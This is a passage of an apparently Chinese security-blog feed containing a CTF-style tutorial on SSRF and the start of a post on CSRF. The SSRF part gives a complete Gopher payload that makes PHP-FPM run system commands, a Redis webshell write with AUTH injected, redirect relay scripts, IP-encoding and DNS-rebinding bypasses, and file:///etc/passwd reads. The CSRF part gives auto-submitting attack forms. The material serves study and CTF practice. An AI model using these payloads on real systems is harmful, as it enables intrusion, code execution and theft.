title="SSRF常见利用–Gopher://协议"></a>SSRF常见利用–Gopher://协议</h2><blockquote><p>Gopher拓展攻击面：</p><p>Gopher协议是HTTP协议出现之前，在Internet上常见且常用的一个协议。当然现在Gopher协议已经慢慢淡出历史。</p><p>Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。这无疑极大拓宽了SSRF的攻击面。</p></blockquote><h2 id="SSRF-REDIS写入WEBSHEEL"><a href="#SSRF-REDIS写入WEBSHEEL" class="headerlink" title="SSRF+REDIS写入WEBSHEEL"></a>SSRF+REDIS写入WEBSHEEL</h2><h3 id="自动化神奇利用生成payload"><a href="#自动化神奇利用生成payload" class="headerlink" title="自动化神奇利用生成payload"></a>自动化神奇利用生成payload</h3><p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="http://qiniuyun.lintstar.top/20200805101650.png" alt="20200805101650"></p><h2 id="SSRF常见利用-urllib头注入"><a href="#SSRF常见利用-urllib头注入" class="headerlink" title="SSRF常见利用-urllib头注入"></a>SSRF常见利用-urllib头注入</h2><p>攻击内网Redis</p><h2 id="SSRF常见利用-30x跳转"><a href="#SSRF常见利用-30x跳转" class="headerlink" title="SSRF常见利用-30x跳转"></a>SSRF常见利用-30x跳转</h2><p>利用http状态码30x来探测端口、服务</p><p>配合burp，即可快速探测。注意二次编码问题，理论上来讲，穿过几层就编码几次</p><p>常见中转脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location:"</span>.$_GET[<span class="string">"url"</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location:"</span>.$_GET[<span class="string">'schema'</span>].<span class="string">"://"</span>.$_GET[<span class="string">'host'</span>].<span class="string">":"</span>.$_GET[<span class="string">'port'</span>].<span class="string">"/"</span>.$_GET[<span class="string">"url"</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="SSRF漏洞绕过"><a href="#SSRF漏洞绕过" class="headerlink" title="SSRF漏洞绕过"></a>SSRF漏洞绕过</h1><h2 id="SSRF常见绕过-短地址"><a href="#SSRF常见绕过-短地址" class="headerlink" title="SSRF常见绕过-短地址"></a>SSRF常见绕过-短地址</h2><p>利用各大短地址生成平台，生成短的地址，绕过长度限制</p><h2 id="SSRF常见绕过-xip-io"><a href="#SSRF常见绕过-xip-io" class="headerlink" title="SSRF常见绕过 -xip.io"></a>SSRF常见绕过 -xip.io</h2><p>xip.io是一个公开的DNS解析站，是一个由SamStephenson所提供的免费DNS转址，xip.io用于提供内网DNS解析，许多的套件都利用xip.io来做内网解析，如MAMP，功能就是将***.127.0.0.1.xip.io解析成127.0.0.1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io             resolvesto      10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io         resolvesto      10.0.0.1</span><br><span class="line">mysite.10.0.0.1.xip.io      resolvesto      10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io     resolvesto      10.0.0.1</span><br></pre></td></tr></table></figure><h2 id="SSRF常见绕过-IP格式绕过"><a href="#SSRF常见绕过-IP格式绕过" class="headerlink" title="SSRF常见绕过-IP格式绕过"></a>SSRF常见绕过-IP格式绕过</h2><p>十进制转换八进制转换十六进制转换不同进制组合转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数字地址(十进制)：127.0.0.1-&gt;2130706433</span><br><span class="line">十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01</span><br><span class="line">八进制：127.0.0.1-&gt;0177.0.0.1或0177.00.00.01</span><br><span class="line">省略写法：127.0.0.1-&gt;127.1</span><br><span class="line">如127.0.0.1：http://localhost/</span><br></pre></td></tr></table></figure><h2 id="SSRF常见绕过-协议绕过"><a href="#SSRF常见绕过-协议绕过" class="headerlink" title="SSRF常见绕过-协议绕过"></a>SSRF常见绕过-协议绕过</h2><p>当url协议限定只为http(s)时，可以利用<strong>followredirect</strong>特性构造302跳转服务file://localhost/etc/passwd在某些java环境下，file:///etc/passwd?1.jpg也是可以读取到</p><h2 id="SSRF进阶利用-log"><a href="#SSRF进阶利用-log" class="headerlink" title="SSRF进阶利用-log"></a>SSRF进阶利用-log</h2><h3 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h3><p>没有办法获取回显的情况下，使用dnslog来获取回显无疑是个好办法</p><h3 id="httplog"><a href="#httplog" class="headerlink" title="httplog"></a>httplog</h3><p>使用http日志也可以方便的定位到存在ssrf的位置，以及ip等详细信息</p><h2 id="SSRF进阶利用-time"><a href="#SSRF进阶利用-time" class="headerlink" title="SSRF进阶利用-time"></a>SSRF进阶利用-time</h2><p>盲注的灵感:<br>其实不只在sql注入和命令执行中有时间盲注，ssrf也有，端口开放不开放产生的时间延迟说不定也有规律可寻</p><h2 id="SSRF进阶利用-dns-rebinding"><a href="#SSRF进阶利用-dns-rebinding" class="headerlink" title="SSRF进阶利用-dns rebinding"></a>SSRF进阶利用-dns rebinding</h2><p><img src="http://qiniuyun.lintstar.top/20200805131001.png" alt="20200805131001"></p><h2 id="差异化导致的问题"><a href="#差异化导致的问题" class="headerlink" title="差异化导致的问题"></a>差异化导致的问题</h2><p>不同的语言和库对url的识别不用，也会导致问题的产生。</p><p><img src="http://qiniuyun.lintstar.top/20200805131315.png" alt="20200805131315"></p><h1 id="SSRF实战"><a href="#SSRF实战" class="headerlink" title="SSRF实战"></a>SSRF实战</h1><blockquote><p><strong>一句话总结：让你的目标代替你去进行操作</strong></p></blockquote><h2 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h2><p>题目：</p><p><img src="http://qiniuyun.lintstar.top/20200805102040.png" alt="20200805102040"></p><p>可以探测外网：<br><a href="http://10.20.25.44/?url=https://www.qq.com" target="_blank" rel="noopener">http://10.20.25.44/?url=https://www.qq.com</a></p><p><img src="http://qiniuyun.lintstar.top/20200805102227.png" alt="20200805102227"></p><p>探测内网c段：<br><a href="http://10.20.25.44/?url=file:///etc/hosts" target="_blank" rel="noopener">http://10.20.25.44/?url=file:///etc/hosts</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">//如果把这行注释掉的话，就会直接输出</span></span><br><span class="line">    $result=curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">echo</span>($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> localhost ::<span class="number">1</span> localhost ip6-localhost ip6-loopback fe00::<span class="number">0</span> ip6-localnet ff00::<span class="number">0</span> ip6-mcastprefix ff02::<span class="number">1</span> ip6-allnodes ff02::<span class="number">2</span> ip6-allrouters <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> <span class="number">1</span>efb3a2d4c9e</span><br></pre></td></tr></table></figure><p>尝试访问<a href="http://10.20.25.44/?url=172.17.0.3" target="_blank" rel="noopener">http://10.20.25.44/?url=172.17.0.3</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">//如果把这行注释掉的话，就会直接输出</span></span><br><span class="line">    $result=curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">echo</span>($result);</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;ssrf1_37863789u82&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200805133217.png" alt="20200805133217"></p><h2 id="gopherus-–exploit-redis"><a href="#gopherus-–exploit-redis" class="headerlink" title="gopherus –exploit redis"></a><strong>gopherus –exploit redis</strong></h2><blockquote><p><strong>本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。</strong></p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200805132159.png" alt="20200805132159"></p><p>项目地址：<a href="https://github.com/Beipy/BeipyVideoResolution" target="_blank" rel="noopener">https://github.com/Beipy/BeipyVideoResolution</a></p><p>题目：<br><a href="http://10.20.25.44:82/" target="_blank" rel="noopener">http://10.20.25.44:82/</a> SSRF 打 redis, redis 密码 root</p><p>审计代码，看到 data/title.php 中有 SSRF 点，且为 curl，可以请求 gopher://。</p><p>所以使用gopherus生成payload，注意参数：</p><p><img src="http://qiniuyun.lintstar.top/20200805132357.png" alt="20200805132357"></p><p>进行解码：</p><p><img src="http://qiniuyun.lintstar.top/20200805132606.png" alt="20200805132606"></p><p>因为redis需要密码登录，所以我们需要修改payload 加入密码root</p><p>回到scripts/目录下，编辑Redis.py</p><blockquote><p>注意要改的是下面shell的，不是上面反弹shell的</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200805133810.png" alt="20200805133810"></p><p>加入下面的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*2\r</span><br><span class="line">$4\r</span><br><span class="line">auth\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line"></span><br><span class="line">\r 是回车</span><br><span class="line">*2 表示增加两个参数</span><br><span class="line">$4 表示占四个字节</span><br></pre></td></tr></table></figure><blockquote><p>本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200805134002.png" alt="20200805134002"></p><p>注意改的时候一定记得字节长度要匹配：</p><p><img src="http://qiniuyun.lintstar.top/20200805134110.png" alt="20200805134110"></p><p>重新生成payload：</p><p><img src="http://qiniuyun.lintstar.top/20200805134330.png" alt="20200805134330"></p><p><img src="http://qiniuyun.lintstar.top/20200805135831.png" alt="20200805135831"></p><p>再编码一次：</p><p><img src="http://qiniuyun.lintstar.top/20200805140009.png" alt="20200805140009"></p><p>上传payload：</p><p><img src="http://qiniuyun.lintstar.top/20200805135944.png" alt="20200805135944"></p><p>访问：<a href="http://10.20.25.44:82/wfbww.php" target="_blank" rel="noopener">http://10.20.25.44:82/wfbww.php</a></p><p><img src="http://qiniuyun.lintstar.top/20200805140057.png" alt="20200805140057"></p><p>然后加上：<code>/wfbww.php?a=system(&#39;cat /flag&#39;);</code><br>就可以得到flag</p><blockquote><p>要不要编码要看content type 是urlencoded就已经自动解码过了，所以要再编一次</p><p>get会自动解码一次所以要再编码一次</p></blockquote><h2 id="gopherus-–exploit-fastcgi"><a href="#gopherus-–exploit-fastcgi" class="headerlink" title="gopherus –exploit fastcgi"></a><strong>gopherus –exploit fastcgi</strong></h2><p><a href="http://10.20.25.44:84/" target="_blank" rel="noopener">http://10.20.25.44:84/</a> 打 php-fpm</p><p>首先访问<a href="http://10.20.25.44:91/?url=gopher://127.0.0.1/9000" target="_blank" rel="noopener">http://10.20.25.44:91/?url=gopher://127.0.0.1/9000</a><br>发现在加载，说明开启了相应端口</p><p><img src="http://qiniuyun.lintstar.top/20200805111222.png" alt="20200805111222"></p><p>用工具生成payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200805120901.png" alt="20200805120901"></p><p>因为是GET形式会自动解码一次所以要去url编码得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%30%30%30%2f%5f%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%35%36%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%38%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%6c%73%25%32%30%2f%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200805120707.png" alt="20200805120707"></p><p>上传payload:</p><p><img src="http://qiniuyun.lintstar.top/20200805120728.png" alt="20200805120728"></p><p>发现执行了<code>ls /</code>命令，根目录下有ffffffffffllllllllaaagggggg文件</p><p>重新生成<code>cat /ffffffffffllllllllaaagggggg</code>命令的payload并再次URL编码：</p><p><img src="http://qiniuyun.lintstar.top/20200805122012.png" alt="20200805122012"></p><p>上传payload得到flag:</p><p><img src="http://qiniuyun.lintstar.top/20200805122051.png" alt="20200805122051"></p><p>类似题目：<a href="https://www.cnblogs.com/zaqzzz/p/11975948.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/11975948.html</a></p><h2 id="DNS重定向"><a href="#DNS重定向" class="headerlink" title="DNS重定向"></a>DNS重定向</h2><p><a href="http://das.wetolink.com:45080/" target="_blank" rel="noopener">http://das.wetolink.com:45080/</a> 拿到 flag  提示：DNS 重绑定 ceye.io</p><p><img src="http://qiniuyun.lintstar.top/image-20200809204710025.png" alt="image-20200809204710025"></p><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// /flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $result = parse_url($_GET[<span class="string">'url'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $result[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'scheme!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ip = gethostbyname($result[<span class="string">'host'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ip!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($ip === <span class="string">"127.0.0.1"</span> || $ip === <span class="string">"0.0.0.0"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ip!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>获取 url 参数，进行解析，解析之后判断协议是否为 http 和 https，再继续获取域名中的host 进行解析，判断解析之后的 ip 是否不为内网 ip，不为内网 ip 再继续往下利用 file_get_contents 发出请求。此处存在有限制的 SSRF 点。</p></blockquote><p>看到开头有 flag.php，则我们可以尝试访问，告诉我们需要从 127.0.0.1 也就是本地访问才行。</p><p><img src="http://qiniuyun.lintstar.top/20200810215909.png" alt="20200810215909"></p><p>所以要想办法通过前面的 SSRF 点访问到 127.0.0.1 的<code>/flag.php</code> 才能获得flag。有解析判断ip，那如何绕过呢？就可以用到之前学习的 DNS 重绑定了，让其第一次返回内网地址之外的地址，正式请求时再次解析再解析到127.0.0.1，即可请求道 127.0.0.1 的 <code>/flag.php</code>。</p><p>这里使用 ceye.io 的 DNS 重绑定域名来完成。打开 ceye.io，看到 profile，设置 DNS rebinding。</p><p><img src="http://qiniuyun.lintstar.top/20200810220258.png" alt="20200810220258"></p><p>记录下自己的域名，比如 <code>qcqi7p.ceye.io</code>，则 dns rebinding 的域名就是 <code>r.qcqi7p.ceye.io</code>。</p><p>发出请求进行尝试: <code>http://das.wetolink.com:45080/?url=http://r.qcqi7p.ceye.io/flag.php</code>有时要多试几次，因为 DNS rebinding 是随机返回的，要拼一下运气。多试几次即可拿到 flag。</p><p><img src="http://qiniuyun.lintstar.top/20200810220659.png" alt="20200810220659"></p><h1 id="Dns-Rebinding的使用"><a href="#Dns-Rebinding的使用" class="headerlink" title="Dns Rebinding的使用"></a>Dns Rebinding的使用</h1><p><strong><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></strong></p><p><strong>基本原理为目标 SSRF 点需要先验证输入的 url 里的 host 解析是否不为某些地址（例如内网地址），不为这些地址则继续请求，但之后正式请求时会重新解析一遍，这次解析到的就是另外一个地址，导致最终请求到的就是另外一个地址。</strong></p><p>例：有一个域名，开了 dns rebinding 功能，设置返回 223.5.5.5 和 127.0.0.1</p><ul><li><p>验证时解析该域名返回 223.5.5.5，通过。</p></li><li><p>正式请求时该域名解析返回的则是 127.0.0.1。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF服务端请求伪造攻击&quot;&gt;&lt;a href=&quot;#SSRF服务端请求伪造攻击&quot; class=&quot;headerlink&quot; title=&quot;SSRF服务端请求伪造攻击&quot;&gt;&lt;/a&gt;SSRF服务端请求伪造攻击&lt;/h1&gt;&lt;h2 id=&quot;什么是SSRF&quot;&gt;&lt;a href=&quot;#什么
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CSRF跨站请求伪造攻击</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined07/ecd34c17.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined07/ecd34c17.html</id>
    <published>2020-08-07T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:37.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>攻击者盗⽤了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成 了攻击者所期望的⼀个操作，⽐如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚 ⾄于购买商品、虚拟货币转账等。</p><p>类⽐成语：<strong>借⼑杀⼈</strong></p><p>⼀般伪造身份中，这把“⼑”就是受害者的Cookie信息，⽤受害者的Cookie来做⼀些违规的事情。</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="正常交互流程"><a href="#正常交互流程" class="headerlink" title="正常交互流程"></a>正常交互流程</h2><blockquote><p>⽤户输⼊密码 -&gt; 服务器</p><p>服务器 -&gt; Cookie</p><p>⽤户使⽤Cookie -&gt; 登陆系统</p></blockquote><h2 id="修改Cookie"><a href="#修改Cookie" class="headerlink" title="修改Cookie"></a>修改Cookie</h2><ul><li>使⽤Burp抓包改包</li><li>审查元素修改</li></ul><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><p>如果⼀个⽹站某个地⽅的功能，⽐如⽤户修改邮箱是通过GET请求进⾏修改的。如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?id=1&amp;email=123@163.com</span><br></pre></td></tr></table></figure><p>这个链接的意思是⽤户id=1将邮箱修改为<a href="mailto:`123@163.com" target="_blank" rel="noopener">`123@163.com</a>`。 当我们把这个链接修改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?id=1&amp;email=abc@163.com</span><br></pre></td></tr></table></figure><p>然后通过各种⼿段发送给被攻击者，诱使被攻击者点击我们的链接，当⽤户刚好在访问这个⽹站，他同 时⼜点击了这个链接，那么悲剧发⽣了。这个⽤户的邮箱被修改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc@163.com</span><br></pre></td></tr></table></figure><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><p>在普通⽤户的眼中，点击⽹⻚-&gt;打开试看视频-&gt;购买视频是⼀个很正常的⼀个流程。可是在攻击者的眼 中可以算正常，但⼜不正常的，当然不正常的情况下，是在开发者安全意识不⾜所造成的。攻击者在购 买处抓到购买时候⽹站处理购买(扣除)⽤户余额的地址。⽐如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/coures/user/handler/25332/buy.php</span><br></pre></td></tr></table></figure><p>通过提交表单，buy.php处理购买的信息，这⾥的25532为视频ID。那么攻击者现在构造⼀个链接，链接中包含以下内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/coures/user/handler/25332/buy</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xx"</span> <span class="attr">value</span>=<span class="string">"xx"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> document.forms[0].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当⽤户访问该⻚⾯后，表单会⾃动提交，相当于模拟⽤户完成了⼀次POST操作，⾃动购买了id为25332 的视频，从⽽导致受害者余额扣除。</p><h1 id="CSRF构造技巧"><a href="#CSRF构造技巧" class="headerlink" title="CSRF构造技巧"></a>CSRF构造技巧</h1><p><img src="http://qiniuyun.lintstar.top/20200804225616.png" alt="20200804225616"></p><p>Burpsuite其实已经⾃带的Generate CSRF PoC，在抓包的时候，右键，可以直接⽣成⼀个CSRF的 表单，这个时候只需要讲这个表单发给受害者，然后受害者去访问触发即可。<br>Burpsuite⽣成的表单默认是有提交按钮的，下⾯是⼀个测试的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/zblog/zb_system/cmd.php? act=ArticlePst&amp;csrfToken=8afa14acf50cdc6983f15a234d598644"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"ID"</span> <span class="attr">value</span>=<span class="string">"0"</span> 